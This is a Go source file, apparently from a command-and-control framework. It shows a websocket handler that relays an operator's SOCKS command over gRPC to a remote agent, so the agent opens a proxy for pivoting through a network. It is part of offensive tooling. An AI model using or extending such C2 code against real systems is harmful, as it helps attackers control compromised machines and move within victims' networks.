// internal/websocket/handlers/socks.go
package handlers

import (
	"c2/internal/websocket/hub"
	"encoding/json"
	"fmt"
	"log"
	"strings"
)

func (h *WSHandler) handleSocksCommand(client *hub.Client, message []byte) error {
	var msg struct {
		Type string `json:"type"`
		Data struct {
			Command   string `json:"command"`
			AgentID   string `json:"agent_id"`
			SocksPort int    `json:"port"`
			WSSPort   int    `json:"wss_port"`
			BasePath  string `json:"base_path"`
		} `json:"data"`
	}

	if err := json.Unmarshal(message, &msg); err != nil {
		return fmt.Errorf("failed to unmarshal SOCKS message: %v", err)
	}

	parts := strings.Fields(msg.Data.Command)
	if len(parts) < 3 {
		return fmt.Errorf("invalid SOCKS command format")
	}

	// Format command for agent
	command := map[string]interface{}{
		"command":  "socks",
		"agent_id": msg.Data.AgentID,
		"data": map[string]interface{}{
			"action":     parts[1],
			"socks_port": msg.Data.SocksPort,
			"wss_port":   msg.Data.WSSPort,
			"path":       msg.Data.BasePath,
		},
	}

	// Queue via gRPC stream
	if err := h.agentClient.SendToStream("agent_command", command); err != nil {
		log.Printf("Failed to send SOCKS command: %v", err)
		return err
	}

	// Send acknowledgment
	response := Response{
		Type:    "command_queued",
		Status:  "success",
		Message: fmt.Sprintf("SOCKS %s command queued", parts[1]),
	}

	responseJSON, _ := json.Marshal(response)
	client.Send <- responseJSON

	return nil
}
